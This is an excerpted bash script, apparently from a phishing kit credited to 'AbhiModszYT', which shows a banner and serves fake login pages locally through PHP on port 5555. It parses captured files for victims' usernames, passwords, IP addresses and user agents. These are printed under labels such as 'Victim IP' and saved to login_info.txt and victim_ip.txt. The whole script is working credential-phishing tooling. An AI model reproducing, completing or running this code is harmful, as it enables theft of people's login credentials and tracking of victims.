#!/bin/bash
#code recorded by AbhiModszYT
#https://t.me/AbhiModszYT_Return
...
printf " \e[91m     /  \ \e[0m\e[1;92m   ████╗ ████║ \e[0m\e[1;93m ██╔════╝ \e[0m\e[1;91m  ▀█████████████▀ \e[0m\n"
printf " \e[91m    / /\ \ \e[0m\e[1;92m  ██╔████╔██║ \e[0m\e[1;93m █████╗ \e[0m\e[1;91m        █▄███▄█ \e[0m\n"
printf " \e[91m   / ____ \ \e[0m\e[1;92m ██║╚██╔╝██║ \e[0m\e[1;93m ██╔══╝ \e[0m\e[1;91m         █████ \e[0m\n"
printf " \e[91m /_/    \_\ \e[0m\e[1;92m ██║ ╚═╝ ██║ \e[0m\e[1;93m ██║ \e[0m\e[1;91m            █▀█▀█ \e[0m\n"
printf " \e[91m ══════════ \e[0m\e[1;92m ╚═╝     ╚═╝ \e[0m\e[1;93m ╚═╝ \e[0m\e[40;38;5;82mversion\e[30;48;5;82m1.2\e[0m\n"
printf " \e[44m CODE BY AMBOT \e[0m\n"
printf " \n"
}
menu() {
...
start_s() {
if [[ -e am/websites/$server/ip.txt ]]; then
rm -rf am/websites/$server/ip.txt
fi
if [[ -e am/websites/$server/usernames.txt ]]; then
rm -rf am/websites/$server/usernames.txt
fi
def_port="5555"
printf "\e[0m\n"
...
cd am/websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
...
cd am/websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 2
...
sleep 0.75
if [[ -e "am/websites/$server/usernames.txt" ]]; then
account=$(grep -o 'Username:.*' am/websites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' am/websites/$server/usernames.txt | cut -d ":" -f2)
...
cat am/websites/$server/usernames.txt >> am/websites/$server/login_info.txt
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;91m Saved:\e[0m\e[1;92m am/websites/%s/login_info.txt\e[0m\n" $server
printf "\n"
...
c_ip() {
touch am/websites/$server/login_info.txt
ip=$(grep -a 'IP:' am/websites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' am/websites/$server/ip.txt | cut -d '"' -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Victim IP:\e[0m\e[1;91m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;91m Saved:\e[0m\e[1;92m am/websites/%s/victim_ip.txt\e[0m\n" $server
printf "\n"
cat am/websites/$server/ip.txt >> am/websites/$server/victim_ip.txt
}
c_cred() {
account=$(grep -o 'Username:.*' am/websites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
